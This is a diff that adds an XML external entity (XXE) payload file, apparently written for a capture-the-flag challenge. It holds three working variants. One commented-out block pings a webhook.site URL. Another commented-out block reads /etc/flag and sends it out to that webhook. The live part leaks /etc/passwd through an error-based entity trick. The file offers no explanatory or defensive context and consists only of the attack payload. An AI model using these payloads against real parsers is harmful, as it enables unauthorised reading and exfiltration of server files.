@@ -1,0 +1,14 @@
+<!-- For just Triggering a URL
+<!DOCTYPE foo [ 
+<!ENTITY % xxe SYSTEM "https://webhook.site/6d807a44-8cac-42f7-a085-0c40361ffbc2"> 
+%xxe; ]> -->
+
+<!-- <!ENTITY % file SYSTEM "file:///etc/flag">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://webhook.site/6d807a44-8cac-42f7-a085-0c40361ffbc2/?x=%file;'>">
+%eval;
+%exfiltrate; -->
+
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
